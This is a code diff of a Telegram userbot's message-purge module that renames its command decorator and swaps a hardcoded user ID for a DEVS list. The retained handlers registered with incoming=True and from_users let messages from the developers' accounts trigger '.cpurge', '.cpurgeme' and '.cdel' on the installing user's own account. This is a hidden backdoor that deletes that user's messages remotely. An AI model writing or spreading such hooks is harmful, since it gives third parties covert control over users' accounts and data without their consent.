@@ -11,11 +11,11 @@ from telethon.errors import rpcbaseerrors
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
 from userbot.events import register
-from userbot.utils import skyzu_cmd
+from userbot.utils import lepin_cmd
 
 
-@skyzu_cmd(pattern="purge$")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cpurge$")
+@lepin_cmd(pattern="purge$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -50,8 +50,8 @@ async def fastpurger(purg):
     await done.delete()
 
 
-@skyzu_cmd(pattern="purgeme")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cpurgeme")
+@lepin_cmd(pattern="purgeme")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
@@ -78,8 +78,8 @@ async def purgeme(delme):
     await smsg.delete()
 
 
-@skyzu_cmd(pattern="del$")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cdel$")
+@lepin_cmd(pattern="del$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
 async def delete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
@@ -100,7 +100,7 @@ async def delete_it(delme):
             """
 
 
-@skyzu_cmd(pattern="edit")
+@lepin_cmd(pattern="edit")
 async def editer(edit):
     message = edit.text
     chat = await edit.get_input_chat()
@@ -120,7 +120,7 @@ async def editer(edit):
    """
 
 
-@skyzu_cmd(pattern="sd")
+@lepin_cmd(pattern="sd")
 async def selfdestruct(destroy):
     message = destroy.text
     counter = int(message[4:6])
